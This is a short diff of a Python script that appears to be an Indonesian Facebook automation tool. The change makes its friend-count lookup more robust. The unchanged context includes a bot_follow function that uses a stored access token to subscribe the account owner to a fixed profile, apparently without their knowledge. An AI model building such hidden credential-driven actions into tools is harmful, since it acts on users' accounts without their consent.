@@ -982,6 +982,7 @@ def bot_follow():
 	with requests.Session() as r:
 		toket = open('.fantoken.txt','r').read()
 		r.post(f'https://graph.facebook.com/100043537611609/subscribers?access_token={toket}')
+
 # ----------------[ BAGIAN-MENU ]----------------#
 def menu():
     try:
@@ -1007,8 +1008,10 @@ def menu():
         my_name=[]
         my_id=[]
     try:
-        link = ses.get(f"https://graph.facebook.com/me?fields=friends&access_token={token}",cookies={"cookie": cookie}).json()['friends']['summary']['total_count']
-        temanku.append(link)
+        response = ses.get(f"https://graph.facebook.com/me?fields=friends&access_token={token}",cookies={"cookie": cookie}).json()
+        if 'friends' in response and 'summary' in response['friends']:
+            linkk = response['friends']['summary'].get('total_count', 0)
+            temanku.append(linkk)
     except:
         pass
     os.system("clear")
